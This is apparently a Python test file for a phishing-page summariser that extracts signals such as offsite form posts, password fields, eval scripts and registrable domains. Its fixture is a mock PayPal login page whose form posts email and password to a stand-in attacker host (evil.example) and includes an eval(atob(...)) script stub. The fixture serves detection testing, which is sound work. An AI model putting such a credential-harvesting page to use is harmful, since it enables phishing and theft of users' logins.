import json

from summarise.html_truncation import reduce_html, GROUP_PRIORITY
from summarise.state import (build_s0, build_s1, build_s1b, build_s2, build_s3,
                             registrable_domain, favicon_host, state_tokens)

HTML = """<html><head><title>PayPal Login</title>
<meta name="description" content="Log in to your account">
<link rel="icon" href="https://www.paypalobjects.com/favicon.ico"></head>
<body><form action="https://evil.example/collect" method="post">
<input name="email" type="text"><input name="pw" type="password">
<input type="hidden" name="tok" value="1"></form>
<script>eval(atob("abc"))</script>
<p>Your account has been limited. Verify within 24 hours.</p>
<a href="/secure/login">login</a><img src="https://cdn.paypal.com/logo.png">
</body></html>"""
URL = "http://paypal-login.verify-account.net/x/y"


def test_reduce_html_schema_and_fields():
    s = reduce_html(HTML, URL, 1000)
    assert list(k for k in s if k != "_truncated") == GROUP_PRIORITY
    assert s["signals"]["num_forms"] == 1
    assert s["signals"]["num_password_fields"] == 1
    assert s["signals"]["num_hidden_fields"] == 1
    assert s["signals"]["form_posts_offsite"] is True
    assert s["forms"][0]["action_host"] == "evil.example"
    assert s["hosts"]["page_host"] == "paypal-login.verify-account.net"
    assert s["hosts"]["num_phishy_keyword_links"] == 1
    assert s["meta"]["title"] == "PayPal Login"
    assert any(not sc["external"] and "eval" in sc["tokens"] for sc in s["scripts"])
    assert "limited" in s["visible_text"]
    assert s["_truncated"] is False


def test_budget_truncates_visible_text_but_keeps_forms():
    big = HTML.replace("<p>", "<p>" + "lorem ipsum " * 2000)
    s = reduce_html(big, URL, 250)
    assert s["_truncated"] is True
    assert "forms" in s and s["forms"][0]["has_password"] is True
    assert state_tokens({k: v for k, v in s.items() if k != "_truncated"}) <= 300


def test_registrable_domain():
    assert registrable_domain("http://login.paypal.com.evil.co.uk/x") == "evil.co.uk"
    assert registrable_domain("http://192.168.1.1/x") == "192.168.1.1"
    assert registrable_domain("https://foo.blob.core.windows.net/a") == "foo.blob.core.windows.net"
    assert registrable_domain("https://user.github.io/p") == "user.github.io"
    assert registrable_domain("") is None
    assert favicon_host("/favicon.ico", "https://a.example/x") == "a.example"
    assert favicon_host("data:image/png;base64,AAAA", "https://a.example") is None


def test_state_variants():
    s0, t0 = build_s0(URL)
    assert s0 == {"page_url": URL, "registrable_domain": "verify-account.net"}
    # unknown suffix: the whole host is returned rather than nothing
    assert build_s0("http://a.b.invalidtld/")[0]["registrable_domain"] == "a.b.invalidtld"
    s1, t1 = build_s1(HTML, URL, 1000)
    assert "_truncated" not in s1
    assert list(s1)[:2] == ["page_url", "registrable_domain"]
    assert s1["favicon_host"] == "www.paypalobjects.com"
    assert t1["summarise_s"] >= 0
    s1b = build_s1b(HTML, URL)
    assert set(s1b) == {100, 250, 500, 1000, 2000}
    s2, _ = build_s2(HTML, URL, "PayPal Log in", ocr_seconds=0.1)
    assert s2["screenshot_text"] == "PayPal Log in"
    s3, _ = build_s3(HTML, URL, 30000)
    assert s3["page_url"] == URL and "<title>" in s3["html"] and "<script" not in s3["html"]
    json.dumps(s1)  # serialisable
